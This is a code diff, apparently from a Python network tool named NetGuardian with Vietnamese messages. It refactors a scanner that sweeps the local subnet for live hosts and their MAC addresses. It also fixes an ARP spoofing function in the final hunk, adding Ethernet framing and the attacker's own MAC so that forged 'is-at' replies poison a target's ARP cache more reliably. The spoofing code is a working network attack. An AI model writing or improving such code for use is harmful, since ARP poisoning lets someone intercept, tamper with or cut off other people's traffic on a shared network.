@@ -1,8 +1,9 @@
+import concurrent.futures
 import socket
 import threading
 import time
 
-from scapy.all import conf, send, srp1
+from scapy.all import conf, send, srp
 from scapy.layers.l2 import ARP, Ether
 from tabulate import tabulate
 
@@ -42,15 +43,12 @@ class NetGuardian:
         try:
             arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
 
-            for _ in range(2):
-                try:
-                    result = srp1(arp_request, timeout=1, verbose=False,
-                                  retry=0, iface=conf.iface)
-                    if result:
-                        return result[ARP].hwsrc
-                except Exception:
-                    continue
+            ans, _ = srp(arp_request, timeout=1, verbose=False, retry=1)
+
+            if ans and len(ans) > 0:
+                return ans[0][1][ARP].hwsrc
             return None
+
         except Exception as e:
             print(f"[!] Lỗi khi lấy MAC của {ip}: {e}")
             return None
@@ -60,22 +58,23 @@ class NetGuardian:
             if ip == self.get_network_info()['local_ip']:
                 return
 
-            socket.setdefaulttimeout(1)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.settimeout(1)
+                result = sock.connect_ex((ip, 135))
 
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            result = sock.connect_ex((ip, 135))
-            sock.close()
+                if result == 0:
+                    mac = self.get_mac(ip)
+                    if mac:
+                        with self.lock:
+                            self.devices.append({
+                                'ip': ip,
+                                'mac': mac,
+                                'hostname': self.get_hostname(ip),
+                                'status': 'Hoạt động'
+                            })
 
-            if result == 0:
-                mac = self.get_mac(ip)
-                if mac:
-                    with self.lock:
-                        self.devices.append({
-                            'ip': ip,
-                            'mac': mac,
-                            'hostname': self.get_hostname(ip),
-                            'status': 'Hoạt động'
-                        })
+        except socket.error:
+            pass
         except Exception as e:
             print(f"[!] Lỗi khi quét IP {ip}: {e}")
 
@@ -88,29 +87,15 @@ class NetGuardian:
         start_time = time.time()
 
         self.devices = []
-
         ip_parts = net_info['local_ip'].split('.')
-        threads = []
 
-        max_threads = 20
-        active_threads = []
+        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+            futures = []
+            for i in range(1, 255):
+                ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{i}"
+                futures.append(executor.submit(self.scan_ip, ip))
 
-        for i in range(1, 255):
-            ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{i}"
-
-            if len(active_threads) >= max_threads:
-                for t in active_threads:
-                    t.join(timeout=1)
-                active_threads = [t for t in active_threads if t.is_alive()]
-
-            t = threading.Thread(target=self.scan_ip, args=(ip,))
-            t.daemon = True
-            t.start()
-            active_threads.append(t)
-            threads.append(t)
-
-        for t in threads:
-            t.join(timeout=1)
+            concurrent.futures.wait(futures)
 
         scan_time = time.time() - start_time
         print(f"\n[+] Quét hoàn tất! ({scan_time:.2f}s)")
@@ -142,13 +127,14 @@ class NetGuardian:
         try:
             target_mac = self.get_mac(target_ip)
             if target_mac:
-                arp_response = ARP(
+                arp_response = Ether(dst=target_mac)/ARP(
                     pdst=target_ip,
                     hwdst=target_mac,
                     psrc=spoof_ip,
+                    hwsrc=conf.iface.mac,
                     op='is-at'
                 )
-                send(arp_response, verbose=False, iface=conf.iface)
+                send(arp_response, verbose=False)
                 return True
             return False
         except Exception as e:
